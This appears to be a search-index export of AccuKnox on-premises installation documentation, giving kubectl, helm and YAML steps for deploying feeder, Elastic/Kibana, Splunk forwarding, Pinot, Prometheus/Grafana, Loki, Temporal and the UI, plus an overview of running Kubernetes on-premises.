\"elastic\"\n- name: ELASTICSEARCH_PASSWORD\nvalue: \"&lt;elastic-password&gt;\"\n</code></pre></p> </li> <li> <p>To get elastic password <pre><code>kubectl get secret elasticsearch-es-elastic-user -o go-template='{{.data.elastic | base64decode}}' -n namespace\n</code></pre></p> </li> </ul>"},{"location":"accuknox-onprem/onprem-feeder/#43-updating-elastic-search-host-runtimeif-required-to-switch-different-elastic-host","title":"4.3. Updating Elastic Search Host (Runtime):(If required to switch different Elastic host)","text":"<p><pre><code>kubectl set env deploy/feeder-service -n accuknox-feeder-service  ELASTICSEARCH_HOST=\"https://elasticsearch-es-http.test-feed.svc.cluster.local:9200\" ELASTICSEARCH_USERNAME=elastic ELASTICSEARCH_PASSWORD=xxxxxxxxxx\n</code></pre> Note: Likewise other configuration parameters can be updated in Runtime.</p>"},{"location":"accuknox-onprem/onprem-feeder/#44-update-log-path","title":"4.4. Update Log Path:","text":"<ul> <li>To view logs please use the below command</li> </ul> <pre><code>kubectl exec -it -n accuknox-feeder-service pod/&lt;podname&gt; -c filebeat-sidecar -- /bin/bash\n</code></pre> <ul> <li>To Update the Log path configured, please modify the below log input path under file beat inputs.</li> </ul> <pre><code>filebeat.inputs:\n- type: container\npaths:\n- /log_output/cilium.log\n</code></pre>"},{"location":"accuknox-onprem/onprem-feeder/#step-5-forwarding-logs-to-splunk","title":"Step 5: Forwarding Logs to Splunk","text":"<ul> <li>The logs are forwarded to Splunk when the below env variable is enabled. <pre><code>- name: SPLUNK_FEEDER_ENABLED\nvalue: true\n</code></pre></li> <li>The below Configuration parameters can be updated for Splunk configuration. <p>(If Default params needs to be modified) <pre><code> - name: SPLUNK_FEEDER_URL\nvalue: https://&lt;splunk-host&gt;\n- name: SPLUNK_FEEDER_TOKEN\nvalue: \"Token configured on HEC in Splunk App\"\n- name: SPLUNK_FEEDER_SOURCE_TYPE\nvalue: \"Source Type configured on HEC in Splunk App\"\n- name: SPLUNK_FEEDER_SOURCE\nvalue: \"Splunk Source configured on HEC in Splunk App\"\n- name: SPLUNK_FEEDER_INDEX\nvalue: \"Splunk Index configured on HEC in Splunk App\"\n</code></pre></p> </li> </ul>"},{"location":"accuknox-onprem/onprem-feeder/#51-enablingdisabling-splunk-runtime","title":"5.1. Enabling/Disabling Splunk (Runtime):","text":"<pre><code>kubectl set env deploy/feeder -n feeder-service SPLUNK_FEEDER_ENABLED=\"true\"\n</code></pre> <ul> <li>By enabling the flag to true (as above), the logs will be pushed to Splunk.Conversely disabling it to \"false\" will stop pushing logs.</li> </ul> <p>Note: Likewise other configuration parameters can be updated in Runtime.</p>"},{"location":"accuknox-onprem/pinot-install/","title":"Pinot install","text":""},{"location":"accuknox-onprem/pinot-install/#note","title":"Note:","text":"<p>Pinot Operator Deployment 1. Don't change the namespace name because if you change the namespace - You need to change the service name , If the service name is changed ,then you need to change the microservice configmap files . eg: app.yaml.</p> <ol> <li>Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and labels</li> </ol> <p>Taints - pinot:true <p>Labels - pinot:true</p>"},{"location":"accuknox-onprem/pinot-install/#installing-helm","title":"Installing Helm","text":"<p>This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases.</p>"},{"location":"accuknox-onprem/pinot-install/#from-the-binary-releases","title":"From the Binary Releases","text":"<p>Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed.</p> <p>Download your desired version</p> <p>Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz)</p> <p>Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm)</p> <p>Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question.</p> <p>For more reference: Click here..</p> <p>Add accuknox repository to install Pinot helm package</p> <p><pre><code>helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites\nhelm repo update\nhelm search repo accuknox-onprem-prerequisites\nhelm pull accuknox-onprem-prerequisites/pinot-chart --untar\n</code></pre> <pre><code>kubectl create namespace accuknox-pinot\n</code></pre></p> <pre><code>helm install accuknox-pinot pinot -n accuknox-pinot\n</code></pre>"},{"location":"accuknox-onprem/pinot-install/#note_1","title":"Note:","text":"<p>Pinot Schemas and tables should be loaded via Pinot UI.</p>"},{"location":"accuknox-onprem/pinot-purpose/","title":"Pinot purpose","text":"<ul> <li> <p>Pinot is a real-time distributed OLAP datastore, purpose-built to provide ultra low-latency analytics, even at extremely high throughput. It can ingest directly from streaming data sources - such as Apache Kafka and Amazon Kinesis - and make the events available for querying instantly. It can also ingest from batch data sources such as Hadoop HDFS, Amazon S3, Azure ADLS, and Google Cloud Storage.</p> </li> <li> <p>At the heart of the system is a columnar store, with several smart indexing and pre-aggregation techniques for low latency. This makes Pinot the most perfect fit for user-facing realtime analytics. At the same time, Pinot is also a great choice for other analytical use-cases, such as internal dashboards, anomaly detection, and ad-hoc data exploration.</p> </li> </ul> <p>For more reference: click here..</p>"},{"location":"accuknox-onprem/pinot-verify/","title":"Pinot verify","text":"<pre><code>kubectl get all -n accuknox-pinot\n</code></pre>"},{"location":"accuknox-onprem/prom-graf-install/","title":"Prom graf install","text":""},{"location":"accuknox-onprem/prom-graf-install/#note","title":"Note:","text":"<p>Prometheus Grafana Deployment</p> <p>Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Tolerations and Node Selector</p> <pre><code>Tolerations:\n- key:\u201dmonitoring\u201d\n  operator: \u201cEqual\u201d\n  value: \u201ctrue\u201d\n  effect: \u201cNoSchedule\u201d\nNodeselector:\n  monitoring: \u201ctrue\u201d\n</code></pre>"},{"location":"accuknox-onprem/prom-graf-install/#installing-helm","title":"Installing Helm","text":"<p>This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases.</p>"},{"location":"accuknox-onprem/prom-graf-install/#from-the-binary-releases","title":"From the Binary Releases","text":"<p>Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed.</p> <p>Download your desired version</p> <p>Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz)</p> <p>Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm)</p> <p>Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question.</p> <p>For more reference: Click here..</p> <p>Add accuknox repository to install Prometheus &amp; Grafana helm package:</p> <pre><code>helm repo add accuknox-onprem-monitoring https://USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-onprem-monitoring\nhelm repo update\nhelm search repo accuknox-onprem-monitoring  \nhelm pull accuknox-onprem-monitoring/grafana-prometheus-stack --untar\nkubectl create namespace accuknox-monitoring \nkubectl config set-context --current --namespace=accuknox-monitoring \nhelm install prometheusmetrics grafana-prometheus-stack\n</code></pre> <p>Check the Pods deployment:</p> <pre><code>kubectl get pods -n accuknox-monitoring\n</code></pre> <p>Default Username &amp; Password for Grafana:</p> <p>User: admin </p> <p>Password: prom-operator</p>"},{"location":"accuknox-onprem/prom-graf-purpose/","title":"Prom graf purpose","text":"<p>Prometheus is an open-source systems monitoring and alerting toolkit.Prometheus collects and stores its metrics as time series data.</p> <p>Features:</p> <ul> <li>PromQL, a flexible query language to leverage this dimensionality</li> <li>Time series collection happens via a pull model over HTTP</li> <li>Pushing time series is supported via an intermediary gateway</li> <li>Targets are discovered via service discovery or static configuration</li> <li>Multiple modes of graphing and dashboarding support</li> </ul> <p>Dependencies:</p> <p>By default this chart installs additional, dependent charts:</p> <ul> <li>Kube-state-metrics </li> <li>prometheus-node-exporter</li> <li>Grafana</li> </ul>"},{"location":"accuknox-onprem/prom-graf-verify/","title":"Prom graf verify","text":"<pre><code>kubectl get all -n accuknox-monitoring\n</code></pre> <p>You can see all the pods are up and running.</p> <p></p>"},{"location":"accuknox-onprem/support/","title":"Support","text":"<p>Please post your issues on support.accuknox.com</p>"},{"location":"accuknox-onprem/temporal-deploy/","title":"Temporal deploy","text":""},{"location":"accuknox-onprem/temporal-deploy/#temporal-operator-deployment","title":"Temporal Operator Deployment","text":""},{"location":"accuknox-onprem/temporal-deploy/#1-please-create-a-namespace-of-your-choice-example-temporal-server","title":"1. Please create a namespace of your choice. Example : temporal-server","text":"<pre><code>kubectl create ns accuknox-temporal\n</code></pre>"},{"location":"accuknox-onprem/temporal-deploy/#2-clone-the-git-repository","title":"2. Clone the git repository","text":"<ul> <li>git clone https://github.com/temporalio/helm-charts.git</li> <li>mv helm-charts temporal-server-chart</li> <li>Navigate into the directory that holds helm-charts folder.</li> </ul>"},{"location":"accuknox-onprem/temporal-deploy/#3helm-install","title":"3.Helm Install","text":"<p><pre><code>helm upgrade --install accuknox-temporal-server temporal-server-chart  --set server.replicaCount=1 --set cassandra.config.cluster_size=1 --set prometheus.enabled=false --set grafana.enabled=false --set elasticsearch.enabled=false --timeout 15m -n accuknox-temporal\n</code></pre> If Prometheus/ Grafana is not required, please use the below command.</p> <p><pre><code>helm install --set server.replicaCount=1 --set cassandra.config.cluster_size=1 --set prometheus.enabled=false --set grafana.enabled=false --set elasticsearch.enabled=false temporal . --timeout 15m -n accuknox-temporal\nkubectl get all -n temporal-server\n</code></pre> </p>"},{"location":"accuknox-onprem/temporal-deploy/#4-set-the-default-namespace","title":"4 .Set the Default Namespace","text":"<p>Syntax: <pre><code>kubectl exec -n accuknox-temporal -it  pod/temporaltest-admintools-&lt;pod-id&gt; -- /bin/bash tctl --ns default n re\n</code></pre> Example:</p> <p></p>"},{"location":"accuknox-onprem/temporal-deploy/#5-successful-installation","title":"5 .Successful Installation","text":"<ul> <li>Port-forward the temporal-web (:8088) pod to view the temporal workflows UI. <pre><code>kubectl port-forward svc/temporaltest-web 8088:8088 -n accuknox-temporal\n</code></pre></li> </ul>"},{"location":"accuknox-onprem/temporal/","title":"Temporal","text":""},{"location":"accuknox-onprem/temporal/#temporal","title":"Temporal","text":"<ul> <li>Temporal is an orchestration platform for microservices and a workflow engine that runs in a loop until the workflow is complete. The major advantages of temporal include</li> <li>Handling intermittent failures</li> <li>Re-running the failed operations until success.</li> <li>Supporting long running operations.</li> <li> <p>Running multiple operations parallelly.</p> </li> <li> <p>Temporal are written in two types of special purpose functions:</p> </li> </ul>"},{"location":"accuknox-onprem/temporal/#1-what-are-workflows","title":"1. What are workflows ?","text":"<ul> <li>Workflows can be seen as a set of tasks that has a specific goal to achieve and it will run until the goal is achieved. Workflow has various timeout options in order to stop the workflow if it runs for a longer period of time.</li> </ul>"},{"location":"accuknox-onprem/temporal/#2what-are-activities","title":"2.What are activities ?","text":"<ul> <li>Activities contain the business logic of the user application. It is invoked via workflow and task queues. Task queues are used to store activities in a queue and a worker comes and picks up an activity to get it done.</li> </ul>"},{"location":"accuknox-onprem/temporal/#3how-are-temporal-workflows-used-in-accuknox","title":"3.How are temporal workflows used in AccuKnox ?","text":"<ul> <li>There are various components in Accuknox such as Network, System, Anomaly Detection and Data protection and these components send logs to kafka topic.</li> <li>The role of the workflow comes here where there are specific workflows for each component and they continuously run, scanning for logs from kafka.</li> <li>The workflow runs without a pause since the logs from the specific components comes every second and it has to capture it and process the logs such that it can send it to different integration channels.</li> </ul>"},{"location":"accuknox-onprem/ui-deploy/","title":"Ui deploy","text":""},{"location":"accuknox-onprem/ui-deploy/#add-accuknox-repository-to-install-ui-on-vm","title":"Add accuknox repository to install UI on VM","text":"<pre><code>helm repo add accuknox-onprem-ui  https:/USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-ui\nhelm repo update\nhelm search repo accuknox-onprem-ui\nhelm pull accuknox-ui/ui-build --untar\n</code></pre> <p>Step 1 : Install nginx application on VM</p> <p>Step 2: Configure the certmanager(https)(eg: letsencrypt) </p> <p>Step 3: tar -xvf build.tar.gz</p> <p>Step 4: sudo cp -rvf build/* /usr/share/nginx/html/ </p> <p>Step 5: Start the service</p>"},{"location":"accuknox-onprem/ui-onprem-purpose/","title":"Ui onprem purpose","text":"<p>Accuknox UI dashboard provides extensive features, feasible user experience and provides end to end control over a single dashboard.</p>"},{"location":"accuknox-onprem/ui-onprem-purpose/#some-of-the-extensive-features","title":"Some of the extensive features","text":"<ul> <li> <p>Enforce policy via AccuKnox UI from Policy Page and stop this attack once the client onboard his cluster to AccuKnox SaaS.</p> </li> <li> <p>It provides impact before and after applying policy and feature of the recommended policy provided via AccuKnox.</p> </li> <li> <p>It shows respective Logs/Telemetry for the attack Scenario when it blocked the RCE attack.</p> </li> <li> <p>It provides capability to configure notifications to custom channels such as Slack/Splunk [SIEM Integration] if an attacker trying to execute into the client workload from UI itself.</p> </li> </ul>"},{"location":"accuknox-onprem/ui-onprem/","title":"Ui onprem","text":""},{"location":"accuknox-onprem/ui-onprem/#prerequisites","title":"Prerequisites:","text":"<p>Install below packages</p> <pre><code>1. node version v12+  \n2. npm  version  6+\n3. Yarn version 1.17+\n</code></pre> <p>For your reference:</p> <p>https://nodejs.org/en/</p> <p>https://yarnpkg.com/getting-started/install</p> <p>https://docs.npmjs.com/cli/v7/commands/npm-install</p>"},{"location":"accuknox-onprem/ui-onprem/#git-clone-the-onprem-ui","title":"Git Clone the Onprem UI","text":"<pre><code>git clone https://USERNAME:PASSWORD@github.com/accuknox/accuknox-onprem.git\ngit checkout accuknox-onprem-ui\n</code></pre>"},{"location":"accuknox-onprem/ui-onprem/#steps-to-install-accuknox-ui","title":"Steps to install Accuknox UI","text":"<p>Step 1 : $yarn install</p> <p>Step 2 : Need to add the new API- base URL path (path to gateway) in two places in the below project files..</p> <pre><code>    a) LINE 1: ui-app/app/src/constants/urls.ts\n\n    b) LINE 7: ui-app/platform-ui/src/api/custom.js\n\n         Eg: const baseAPIPath = 'https://api-dev.accuknox.com'; \n              change the above api as per your Environment &lt;https://api.example.com&gt;\n</code></pre> <p>Step 3 : $npm run build</p> <pre><code> 3.1 :  optional (Command to remove existing code)\n\n        Eg: $gsutil -m rm -r gs://accuknox-ui/build/*\n</code></pre> <p>Step 4: Pushing build files from apps/build to GCP bucket(aws or azure bucket) </p> <pre><code>        Eg: $gsutil -m cp -r app/build/* gs://accuknox-ui/build/\n</code></pre> <p> Note : Step 4 will vary for different cloud providers  </p> <p>Step 5 : Install nginx application on VM</p> <p>Step 6 : Configure the certmanager(https) </p> <pre><code>       Eg: letsencrypt Tool\n</code></pre> <p>Step 7 : tar -xvf build.tar.gz</p> <p>Step 8 : sudo cp -rvf build/* /usr/share/nginx/html/</p> <p>Step 9 : Start the service</p>"},{"location":"accuknox-onprem/what-is-ak-on-prem/","title":"What is ak on prem","text":""},{"location":"accuknox-onprem/what-is-ak-on-prem/#overview","title":"Overview","text":"<p>The best\u00a0Kubernetes architecture\u00a0for your organization depends on your needs and goals. Kubernetes is often described as a cloud-native technology, and it certainly qualifies as one. However, the cloud-native concept does not exclude the use of on-premises infrastructure in cases where it makes sense. Depending on your organization\u2019s needs regarding compliance, locality and cost for running your workloads, there may be significant advantages to running\u00a0Kubernetes deployments\u00a0on-premises.</p> <p>Kubernetes has achieved an unprecedented adoption rate, due in part to the fact that it substantially simplifies the deployment and management of microservices. Almost equally important is that it allows users who are unable to utilize the public cloud to operate in a \u201ccloud-like\u201d environment. It does this by decoupling dependencies and abstracting infrastructure away from your application stack, giving you the portability and the scalability that\u2019s associated with cloud-native applications.</p>"},{"location":"accuknox-onprem/what-is-ak-on-prem/#why-run-kubernetes-on-premises","title":"Why Run Kubernetes On-premises","text":"<p>Why do organizations choose the path of running Kubernetes in their own data centers, compared to the relative \u201ccake-walk\u201d with public cloud providers? There are typically a few important reasons why an Enterprise may choose to invest in a Kubernetes on-premises strategy:</p> <ol> <li> <p>Compliance &amp; Data Privacy Some organizations simply can\u2019t use the public cloud, as they are bound by stringent regulations related to compliance and data privacy issues. For example, the GDPR compliance rules may prevent enterprises from serving customers in the european region using services hosted in certain public clouds.</p> </li> <li> <p>Business Policy Reasons Business policy needs, such as having to run your workloads at specific geographical locations, may make it difficult to use public clouds. Some enterprises may not be able to utilize public cloud offerings from a specific cloud provider due to their business policies related to competition.</p> </li> <li> <p>Being Cloud Agnostic to Avoid Lock-in Many enterprises may wish to not be tried to a single cloud provider, and hence may want to deploy their applications across multiple clouds, including an on-premises private cloud. This reduces your risk of business continuity impact due to issues with a specific cloud provider. It also gives you\u00a0/leverage around price negotiation\u00a0with your cloud providers.</p> </li> <li> <p>Cost This is probably the\u00a0most important reason\u00a0to run Kubernetes on-premises. Running all of your applications in the public clouds can get pretty expensive at scale. Specifically if your applications\u00a0rely on ingesting and processing a large amount of data,\u00a0such as an AI/ML application, it can get extremely expensive to run it in a public cloud. If you have existing data centers on-premises or in a co-location hosted facility, running Kubernetes on-premises can be an effective way to reduce your operational costs. For more information on this topic, see this latest report from a16z:\u00a0The Cost of Cloud, a Trillion Dollar Paradox Quoted from the report \u201d It\u2019s becoming evident that while cloud clearly delivers on its promise\u00a0early\u00a0on in a company\u2019s journey, the pressure it puts on margins can start to outweigh the benefits, as a company scales and growth slows. Because this shift happens\u00a0later\u00a0in a company\u2019s life, it is difficult to reverse as it\u2019s a result of years of development focused on new features, and not infrastructure optimization\u201d</p> </li> </ol> <p>An effective strategy to run Kubernetes on-premises on your own data centers can be used to\u00a0transform your business\u00a0and modernize your applications for cloud-native \u2013 while improving infrastructure utilization and saving costs at the same time.</p>"},{"location":"accuknox-onprem/what-is-ak-on-prem/#challenges-running-kubernetes-on-premises","title":"Challenges Running Kubernetes On-premises","text":"<p>There is a downside to running Kubernetes on-premises however, specially if you are going the Do-It-Yourself (DIY) route. Kubernetes is known for its steep learning curve and operational complexity. When using Kubernetes on AWS or Azure \u2013 your public cloud provider essentially hides all the complexities from you. Running Kubernetes on-premises means you\u2019re on your own for managing these complexities. Here are specific areas where the complexities are involved:</p> <ol> <li> <p>Etcd\u00a0\u2013 manage highly available etcd cluster. You need to take frequent backups to ensure business continuity in case the cluster goes down and the etcd data is lost.</p> </li> <li> <p>Load balancing\u00a0\u2013 Load balancing may be needed both for your cluster master nodes and your application services running on Kubernetes. Depending on your existing networking setup, you may want to use a load balancer such as F5 or use a software load balancer such as metallb.</p> </li> <li> <p>Availability\u00a0\u2013 Its critical to ensure that your Kubernetes infrastructure is highly available and can withstand data center and infrastructure downtimes. This would mean having multiple master nodes per cluster, and when relevant, having multiple Kubernetes clusters, across different availability zones.</p> </li> <li> <p>Auto-scaling\u00a0\u2013 Auto-scaling for the nodes of your cluster can help save resources because the clusters can automatically expand and contract depending on workload needs. This is difficult to achieve for bare metal Kubernetes clusters, unless you are using a bare metal automation platform such as\u00a0open source Ironic\u00a0or\u00a0Platform9\u2019s Managed Bare Metal.</p> </li> <li> <p>Networking\u00a0\u2013 Networking is very specific to your data center configuration.</p> </li> <li> <p>Persistent storage\u00a0\u2013 Majority of your production workloads running on Kubernetes will require persistent storage \u2013 block or file storage. The good news is that most of the popular enterprise storage vendors have CSI plugins and supported integrations with Kubernetes. You will need to work with your storage vendor to identify the right plugin and install any additional needed components before you can integration your existing storage solution with Kubernetes on-premises.</p> </li> <li> <p>Upgrades\u00a0\u2013 You will need to upgrade your clusters roughly every 3 months when a new upstream version of Kubernetes is released. The version upgrade may create issues if there are API incompatibilities introduced with newer version of Kubernetes. A staged upgrading strategy where your development / test clusters are upgraded first before upgrading your production clusters is recommended.</p> </li> <li> <p>Monitoring\u00a0\u2013 You will need to invest in tooling to monitor the health of your Kubernetes clusters in your on-premise Kubernetes environment. If you have existing monitoring and log management tools such as Datadog or Splunk, most of them have specific capabilities around Kubernetes monitoring. Or you may consider investing in an open source monitoring stack designed to help you monitor Kubernetes clusters such as Prometheus and Grafana.</p> </li> </ol>"},{"location":"accuknox-onprem/what-is-ak-on-prem/#best-practices-for-kubernetes-on-premises","title":"Best Practices for Kubernetes On-premises","text":"<p>Below you will find a set of best practices to run Kubernetes on-premises. Depending on your environment configuration, some or all of these may apply to you.</p> <p>Integrating with Existing Environment</p> <p>Kubernetes enables users to run clusters on a diverse set of infrastructures on-premises . So you can \u201crepurpose\u201d your environment to integrate with Kubernetes \u2013 using virtual machines or creating your own cluster from scratch on bare metal. But you would need to build a deep understanding of the specifics of deploying Kubernetes on your existing environment, including your servers, storage systems, and networking infrastructure, to get a well configured production Kubernetes environment.</p> <p>The three most popular ways to deploy Kubernetes on-premises are:</p> <ol> <li> <p>Virtual machines on your existing VMware vSphere environment</p> </li> <li> <p>Linux physical servers running Ubuntu, CentOS or RHEL Linux</p> </li> <li> <p>Virtual machines on other types of IaaS environments on-premises such as OpenStack.</p> </li> </ol> <p>Running Kubernetes on physical servers can give you native hardware performance, which may be critical for certain types of workloads, however it may limit your ability to quickly scale your infrastructure. If getting bare metal performance is important to you, and if you need to run Kubernetes clusters at scale, then consider investing in a bare metal automation platform such as\u00a0Ironic\u00a0,\u00a0Metal3\u00a0or a managed bare metal stack such as\u00a0Platform9 Managed Bare Metal. Running Kubernetes on virtual machines in your private cloud on VMware or KVM can give you the elasticity of cloud, as you can dynamically scale your Kubernetes clusters up or down based on workload demand. Clusters created on virtual machines are also easy to setup and tear down, making it easy to create ephemeral test environments for developers.</p>"},{"location":"accuknox-onprem/elastic/elastic/","title":"Monitoring your cluster using ELK","text":""},{"location":"accuknox-onprem/elastic/elastic/#overview","title":"Overview","text":"<p>This ELK setup is used for distributed monitoring solution suitable for almost any structured and unstructured data source.</p>"},{"location":"accuknox-onprem/elastic/elastic/#step-1-elastic-operator-deployment","title":"Step 1: Elastic Operator Deployment","text":"<p>1.1 Create a namespace of your choice. Example : elastic-logging</p> <pre><code>kubectl create ns elastic-logging\n</code></pre> <p>Note: Use <code>feeder-service</code> namespace , if required.</p> <p>1.2 Clone the git repository</p> <pre><code>git clone -b dev https://github.com/accuknox/Accuknox-Logging\n</code></pre> <ul> <li>Navigate into the directory that holds eck-operator folder.</li> </ul> <p>1.3 Helm Install (Elastic)</p> <ul> <li>Install the CRDs and deploy the operator with cluster-wide permissions to manage all namespaces. <pre><code>helm repo add elastic https://helm.elastic.co\nhelm install elastic-operator eck-operator -n &lt;namespace&gt;\n</code></pre></li> <li>Enable the elastic resource as <code>true</code> in <code>values.yaml</code> to install Kibana along with feeder. <pre><code>elasticsearch:\nenabled: true\n</code></pre> Note: If there is ELK set up already running on the cluster, the CRD apply may fail.</li> </ul> <p>1.4 Helm Install (Kibana)</p> <ul> <li> <p>Please enable the Kibana resource as <code>true</code> in <code>values.yaml</code> to install Kibana along with feeder. <pre><code>kibana:\nenabled: true\n</code></pre></p> </li> <li> <p>Navigate into the directory that holds kibana folder.</p> </li> </ul> <p>1.5 Beats Setup</p> <ul> <li> <p>The agent will be spinned along with Filebeat running along as a sidecar.</p> </li> <li> <p>The filebeat configuration file in the package can be updated to specific Elastic instances, and logs can be viewed in Kibana.</p> </li> </ul>"},{"location":"accuknox-onprem/elastic/elastic/#a-elastic-configuration-parameters","title":"a. Elastic Configuration Parameters","text":"<ul> <li>We will create a ConfigMap named filebeat-configmap with the content of filebeat.yml file. <pre><code>kind: ConfigMap\nmetadata:\nname: filebeat-configmap\ndata:\nfilebeat.yml: |\nfilebeat.inputs:\n- type: log\n\n# Change to true to enable this input configuration.\nenabled: true\n\n# Paths that should be crawled and fetched. Glob based paths.\npaths:\n- /var/log/*.log\noutput.elasticsearch:\nhosts: ${ELASTICSEARCH_HOST}\nusername: ${ELASTICSEARCH_USERNAME}\npassword: ${ELASTICSEARCH_PASSWORD}\nssl.verification_mode: none\n</code></pre></li> <li> <p>The below Configuration parameters can be updated for elastic configuration.</p> <p>(If Default params needs to be modified) <pre><code> - name: ELASTICSEARCH_HOST\nvalue: https://&lt;svc-name&gt;\n- name: ELASTICSEARCH_PORT\nvalue: \"&lt;svc-port&gt;\"\n- name: ELASTICSEARCH_USERNAME\nvalue: \"elastic\"\n- name: ELASTICSEARCH_PASSWORD\nvalue: \"&lt;elastic-password&gt;\"\n</code></pre></p> </li> <li> <p>To get elastic password <pre><code>kubectl get secret elasticsearch-es-elastic-user -o go-template='{{.data.elastic | base64decode}}' -n namespace\n</code></pre></p> </li> </ul>"},{"location":"accuknox-onprem/elastic/elastic/#b-updating-elastic-search-host-runtime","title":"b. Updating Elastic Search Host (Runtime)","text":"<pre><code>kubectl set env deploy/feeder -n feeder-service ELASTICSEARCH_HOST=\u201dhttps://elasticsearch-es-http\u201d\n</code></pre>"},{"location":"accuknox-onprem/elastic/elastic/#c-update-log-path","title":"c. Update Log Path","text":"<ul> <li>To Update the Log path configured, please modify the below log input path under file beat inputs. <pre><code>filebeat.inputs:\n- type: container\npaths:\n- /log_output/cilium.log\n</code></pre></li> </ul> <p>1.6 Kibana Dashboard</p> <ul> <li> <p>Once the filebeat starts listening, an index will be created or updated on the elastic configured and the pushed logs can be seen.</p> </li> <li> <p>In order to create a dashboard, you will need to build visualizations. Kibana has two panels for this</p> <ul> <li> <p>One called Visualize and</p> </li> <li> <p>Another called Dashboard</p> </li> </ul> </li> <li> <p>In order to create your dashboard, you will first create every individual visualization with the Visualize panel and save them.</p> </li> </ul> <p>1.7 Successful Installation <pre><code>kubectl get all -n &lt;namespace&gt;\nkubectl port-forward svc/kibana-kb-http 5601:5601\n</code></pre></p> <ul> <li>All the pods should be up and running.</li> <li>Kibana Ui with filebeat index should be seen (after beat installation).</li> </ul>"},{"location":"accuknox-onprem/elastic/elastic/#step-2-verify","title":"Step 2: Verify","text":""},{"location":"accuknox-onprem/elastic/elastic/#on-prem-elastic","title":"On Prem Elastic","text":"<ul> <li>The On-Prem Elastic provides the feasibility of pushing the agent logs to Elastic Host using beats and feeder agent.</li> <li>Elasticsearch is a search and analytics engine. It is an open source, full-text search and analysis engine, based on the Apache Lucene search engine.</li> <li>Logstash is a log aggregator that collects data from various input sources, executes different transformations and enhancements and then ships the data to various supported output destinations.</li> <li>Kibana is a visualization layer that works on top of Elasticsearch, providing users with the ability to analyze and visualize the data. And last but not least \u2014 Beats are lightweight agents that are installed on edge hosts to collect different types of data for forwarding into the stack.</li> </ul> <p>2.1 Status of Elastic with On prem Feeder</p> <ul> <li> <p>Run the below command to check if agent and dependent pods are up and running. <pre><code>kubectl get all -n &lt;namespace&gt;\n</code></pre></p> </li> <li> <p>All the pods/services should be in Running state.</p> </li> </ul> <p>2.2 Status of Beats with On prem Feeder</p> <ul> <li>Once the feeder agent starts running, exec into the filebeat sidecar as below. <pre><code>Kubectl exec -it &lt;podname&gt; -c filebeat-sidecar -n &lt;namespace&gt;\nfilebeat -e -d \"*\"\n</code></pre></li> </ul> <p>3. Metrics</p> <ul> <li>Once the feeder agent starts running, check the logs using below command</li> </ul> <pre><code>Kubectl logs \u2013f &lt;podname&gt; \u2013n &lt;namespace&gt;\n</code></pre>"},{"location":"accuknox-onprem/logging/logging/","title":"Monitoring your cluster using Loki","text":""},{"location":"accuknox-onprem/logging/logging/#overview","title":"Overview","text":"<p>This user journey guides you to set up a monitoring facility for the Accuknox control plane cluster and its workloads.</p>"},{"location":"accuknox-onprem/logging/logging/#step-1-create-a-nodepool","title":"Step 1: Create a NodePool","text":"<ul> <li>Create a node pool on GKE / EKS / AKS (or) on-premises worker nodes with below Requirements</li> </ul> NodePool Name Logging No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 16 Disk Size Per Node 50 Total CPU 18 Total Memory 48 Total Disk Size 150 Taints &amp; Lables logging:true Node Pool Name logging"},{"location":"accuknox-onprem/logging/logging/#step-2-install-loki","title":"Step 2: Install Loki","text":"<p>Install Helm:</p> <ul> <li> <p>Helm binary is required to proceed further. To install Click here</p> </li> <li> <p>Add accuknox repository to install  Loki helm package:</p> </li> </ul> <pre><code>helm repo add accuknox-onprem-logging https://USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-onprem-logging \nhelm repo update\nhelm search repo accuknox-onprem-logging\nhelm pull accuknox-onprem-logging/loki-stack  --untar \nkubectl create namespace accuknox-loki-logging \nkubectl config set-context --current --namespace=accuknox-loki-logging \nhelm install loki loki-stack/\n</code></pre> <p><pre><code>kubectl get pods -n accuknox-loki-logging\n</code></pre> </p>"},{"location":"accuknox-onprem/logging/logging/#step-3-grafana-login","title":"Step 3: Grafana Login","text":"<p>Note:</p> <p>Username: admin </p> <p>Password: prom-operator</p> <p>To Change Password:</p> <ul> <li>Scroll Down Below \u2192 Click on Admin Icon \u2192 Change Password</li> </ul> <p></p> <p>Add Endpoint in Grafana Data source:</p> <ul> <li>Click on Configuration Icon \u2192 Data source \u2192 Add data source \u2192 Select loki</li> </ul> <p></p> <ul> <li> <p>Update loki FQDN on loki data source UI</p> </li> <li> <p>Click on save and test.</p> </li> </ul> <p></p> <ul> <li>Click on explore section \u2192 Select the namespace and click \u2192 show logs</li> </ul> <p></p>"},{"location":"accuknox-onprem/monitoring/monitoring/","title":"Monitoring your cluster using Prometheus and Grafana","text":""},{"location":"accuknox-onprem/monitoring/monitoring/#overview","title":"Overview","text":"<p>This user journey guides you to set up a monitoring facility for the Accuknox control plane cluster and its workloads.</p>"},{"location":"accuknox-onprem/monitoring/monitoring/#step-1-create-a-nodepool","title":"Step 1: Create a NodePool","text":"<ul> <li>Create a node pool on GKE / EKS / AKS (or) on-premises worker nodes with below Requirements</li> </ul> Component Name Monitoring No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 10 Disk Size Per Node 50 Total CPU 18 Total Memory 30 Total Disk Size 150 Taints &amp; Lables monitoring:true Node Pool Name 